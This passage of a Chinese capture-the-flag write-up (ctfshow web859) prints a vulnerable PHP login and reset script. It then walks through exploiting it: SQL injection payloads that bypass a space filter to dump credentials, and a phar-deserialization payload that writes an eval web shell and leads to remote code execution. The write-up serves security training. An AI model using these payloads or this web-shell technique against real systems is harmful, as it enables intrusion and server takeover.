class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">/api/index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-02-22 09:15:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-02-22 11:07:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] ?? <span class="string">&quot;login&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doLogin</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doReset</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doView</span>();</span><br><span class="line">				<span class="keyword">break</span>;	</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doDefault</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doFilter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doFilter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">		<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">mysqli_connect_error</span>())));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set name <span class="subst">$charName</span>&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select password from user where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; limit 0,1;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="variable">$password</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆失败&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]?<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dispatcher</span>(<span class="string">&quot;../ckfinder/ckfinder.html&quot;</span>):<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dispatcher</span>(<span class="string">&quot;../index.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doReset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">		<span class="variable">$email</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_POST, <span class="string">&#x27;email&#x27;</span>,FILTER_VALIDATE_EMAIL);</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doFilter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">		<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">mysqli_connect_error</span>())));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set name <span class="subst">$charName</span>&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select email from user where email = &#x27;<span class="subst">$email</span>&#x27; and username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>])&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;RESET&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;email = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;你好！ 已经将重置密码链接发送至邮箱&quot;</span>.<span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;RESET&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;邮箱不存在&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dispatcher</span>(<span class="string">&quot;../index.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doDefault</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;location: ../index.php&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doFilter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;%27&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;%22&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;%5c&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">dispatcher</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:<span class="subst">$url</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">clear</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">sendResetMail</span>(<span class="params"><span class="variable">$mail</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$content</span> = <span class="string">&quot;你好，下面是你的重置密码链接，请复制到浏览器地址栏打开.&quot;</span>;</span><br><span class="line">		<span class="variable">$content</span>.= <span class="string">&quot;http://xxx.com/?token=xxxx&amp;email=<span class="subst">$mail</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//功能暂未实现，先保留邮件，以后发送</span></span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;../mail_cache/cache.php&quot;</span>,<span class="string">&quot;&lt;?php exit(&#x27;<span class="subst">$content</span>&#x27;);?&gt;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkSession</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]!==<span class="literal">true</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;请先登陆&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">doView</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSession</span>();</span><br><span class="line">		<span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/jpeg&quot;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;../ckfinder/userfiles/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>] &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;email))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendResetMail</span>(<span class="variable">$this</span>-&gt;email);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hack here;</span></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">new</span> <span class="title function_ invoke__">action</span>();</span><br><span class="line"><span class="variable">$action</span>-&gt;<span class="title function_ invoke__">doAction</span>();</span><br></pre></td></tr></table></figure>
+
+<p>在登录界面发现账号密码都存在一个filter过滤，但是我们关注到重置页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doReset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$email</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_POST, <span class="string">&#x27;email&#x27;</span>,FILTER_VALIDATE_EMAIL);</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doFilter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">mysqli_connect_error</span>())));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set name <span class="subst">$charName</span>&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select email from user where email = &#x27;<span class="subst">$email</span>&#x27; and username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;RESET&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;email = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;你好！ 已经将重置密码链接发送至邮箱&quot;</span>.<span class="variable language_">$this</span>-&gt;email;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;RESET&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;邮箱不存在&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dispatcher</span>(<span class="string">&quot;../index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话对email并没有过滤，尝试sql注入fuzz一下</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615213106421.png" alt="image-20250615213106421"></p>
+<p>过滤空格了，绕过一下，可以用<code>/**/</code>去绕过</p>
+<p>过滤了括号，双引号，然后我们注入一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=&#x27;union/**/select/**/username/**/from/**/user#@qq.com&amp;username=123</span><br><span class="line">email=&#x27;union/**/select/**/password/**/from/**/user#@qq.com&amp;username=123</span><br></pre></td></tr></table></figure>
+
+<p>拿到账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow/ctfshase????</span><br></pre></td></tr></table></figure>
+
+<p>登录进去是一个文件上传的口子，不过这个这个框架应该是没啥问题的，返回去看看源码吧</p>
+<p>在api&#x2F;index.php中存在一个写文件的功能，假如可以控制<code>$mail</code>的值，就可以写入一个木马进去。</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615214146718.png" alt="image-20250615214146718"></p>
+<p>先看看在哪调用了这个方法</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615214246659.png" alt="image-20250615214246659"></p>
+<p>然后再看哪里调用了clear</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615214345087.png" alt="image-20250615214345087"></p>
+<p>起始调用点是<code>__wakeup</code>，结合文件上传的口子，那我们可以打phar反序列化，在doView函数中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doView</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSession</span>();</span><br><span class="line">	<span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/jpeg&quot;</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;../ckfinder/userfiles/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里file参数的可控的，那我们就可以传文件打phar反序列化了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">action</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>=<span class="string">&quot;&#x27;.eval(\$_POST[1]));//&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">action</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;1.png&#x27;</span>).<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的话有一个检测，需要绕过一下，随便找一个小点的图片，将生成的phar文件后缀名换成png然后上传</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221207242.png" alt="image-20250615221207242"></p>
+<p>上传成功之后我们触发doView方法并触发反序列化</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221338406.png" alt="image-20250615221338406"></p>
+<p>触发后访问&#x2F;mail_cache&#x2F;cache.php</p>
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221510399.png" alt="image-20250615221510399"></p>
+<p>试着RCE试一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250615221535580.png" alt="image-20250615221535580"></p>
+<p>成了，那我们用蚁剑连接，但是其实这个靶机里没有flag，最戏剧的一集了哈哈哈哈哈</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">web859_有跳板机</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&text=ctfshow入门内网渗透"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&is_video=false&description=ctfshow入门内网渗透"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow入门内网渗透&body=Check out this article: https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&title=ctfshow入门内网渗透"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&name=ctfshow入门内网渗透&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
